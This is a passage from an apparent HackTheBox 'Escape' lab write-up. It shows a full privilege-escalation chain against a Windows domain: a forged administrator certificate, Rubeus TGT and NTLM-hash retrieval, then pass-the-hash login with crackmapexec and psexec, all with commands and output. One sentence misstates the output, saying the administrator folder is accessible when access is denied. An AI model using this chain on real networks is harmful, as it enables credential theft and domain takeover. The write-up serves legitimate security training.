  lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAgYI
  KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
  CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
  hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
  Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFOriu4haF+D5eRzdWY+l6F7BZUW5
  MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1Ud
  IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
  gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
  bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
  bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
  ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
  gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
  QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
  bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
  b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
  AAOCAQEAgg/OJa4xkQlsrN1OgopuqEusHHVbp2e6qMrt/HokQlOPv+VTYeMazy2O
  YrHplxzEUPmVmtmfL3oYsPqeSN+WaWLYw/P98Ul+Ny75DE2ERwTaJ6Q/ekqrqmmg
  FlylX7IjQ+Eo4dgDOtolQH7/ah51NkD+Cr6cIPJHhbyLJzt7Ya52JtoYOTwmfrpW
  fw58CLNQO8VYrlAAp9msZR+mgDXhO+QeqcjMgw37TlVtXqEL+XfmaYUaogtl/xl6
  eg5To4bTnSymn1td5Bm6NcWiBNgBD63ZDyASJQbJYy0HUzJ0J1urvdiOdOTZ5m56
  m2Xfo2gAUBCRmT1oRWkjb4u5m5TX7Q==
  -----END CERTIFICATE-----

  [*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

  Certify completed in 00:00:14.1781012
  ```

  Now, all we have to do is copy the private key and the certificate into a file and use the provided command to convert the `.pem` file into a `.pfx` file:

  ```shell
  # covert a pem file to a pfx file
  $ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
  ```

15. Let's transfer [`rubeus.exe`](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe) and our converted pfx file (`cert.pfx`) over to our target the same way as we did with `certify.exe`:

  ```shell
  # copy executable to the directory from where we logged in using WinRM
  $ locate Rubeus.exe
  /usr/share/poshc2/resources/modules/Rubeus.exe

  $ cp /usr/share/poshc2/resources/modules/Rubeus.exe .
  ```

  Next, we can jump back to our WinRM session and upload the files:

  ```shell
  # uploading cert.pfx and rubeus.exe using WinRM
  *Evil-WinRM* PS C:\programdata> upload cert.pfx Rubeus.exe

  Info: Uploading /home/kali/htb/fullpwn/escape/cert.pfx to C:\programdata\Rubeus.exe

  Data: 4564 bytes of 4564 bytes copied

  Info: Upload successful!
  ```

  We now can use Rubeus:

  ```shell
  *Evil-WinRM* PS C:\programdata> .\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx

    ______        _
    (_____ \      | |
    _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v2.2.0

  [*] Action: Ask TGT

  [*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
  [*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\administrator'
  [*] Using domain controller: fe80::7873:c0b2:36e8:b236%4:88
  [+] TGT request successful!
  [*] base64(ticket.kirbi):

        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

    ServiceName              :  krbtgt/sequel.htb
    ServiceRealm             :  SEQUEL.HTB
    UserName                 :  administrator
    UserRealm                :  SEQUEL.HTB
    StartTime                :  1/1/2024 5:45:44 PM
    EndTime                  :  1/2/2024 3:45:44 AM
    RenewTill                :  1/8/2024 5:45:44 PM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable
    KeyType                  :  rc4_hmac
    Base64(key)              :  /+C7dtkZqqDk8IzWo5/s1g==
    ASREP (key)              :  6EE24950A05FBF8C93B223F5F04A0919

  # try to access `administrator` dir
  *Evil-WinRM* PS C:\programdata> dir c:\users\administrator
  Access to the path 'C:\users\administrator' is denied.
  At line:1 char:1
  + dir c:\users\administrator
  + ~~~~~~~~~~~~~~~~~~~~~~~~~~
      + CategoryInfo          : PermissionDenied: (C:\users\administrator:String) [Get-ChildItem], UnauthorizedAccessException
      + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
  ```

  It seems that it failed to inject the cert into our session since we can access `administrator`'s directory. We can try and get the user's NTLM hash:

  ```shell
  # get the credentials of the user administrator including its NTLM hash
  *Evil-WinRM* PS C:\programdata> .\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /show /nowrap

   <SNIP>

  [*] Getting credentials using U2U

    CredentialInfo         :
      Version              : 0
      EncryptionType       : rc4_hmac
      CredentialData       :
        CredentialCount    : 1
        NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
  ```

16. We can use the NTLM hash to log into SMB as `administrator`:

  ```shell
  $ crackmapexec smb escape -u administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE
  SMB         escape          445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
  SMB         escape          445    DC               [+] sequel.htb\administrator:A52F78E4C751E5F5E17E1E9F3E58F4EE (Pwn3d!)
  ```

  That seemed to work, so let's log in using Impacket's `psexec.py`:

  ```shell
  # loggin into SMB as administrator
  $ /opt/impacket/examples/psexec.py -hashes A1:A52F78E4C751E5F5E17E1E9F3E58F4EE administrator@escape
  Impacket v0.12.0.dev1+20231027.123703.c0e949fe - Copyright 2023 Fortra

  [*] Requesting shares on escape.....
  [*] Found writable share ADMIN$
  [*] Uploading file NmCDUcwG.exe
  [*] Opening SVCManager on escape.....
  [*] Creating service CSNh on escape.....
  [*] Starting service CSNh.....
  [!] Press help for extra shell commands
  Microsoft Windows [Version 10.0.17763.2746]
  (c) 2018 Microsoft Corporation. All rights reserved.

  C:\Windows\system32> type c:\users\ryan.cooper\desktop\user.txt
  cff28d60f6c64cfb37cd9a297fade5ac
  C:\Windows\system32> type c:\users\administrator\desktop\root.txt
  c0f21fe068f5dd15803cb78f2a1c916d
  ```

  > We have to supply an LM key in front of the NTLM hash value, in this case `A1`, but it does not actually use it, so any key will work.

## Resources

- IppSec's video walkthrough: [HackTheBox - Escape](https://www.youtube.com/watch?v=PS2duvVcjws).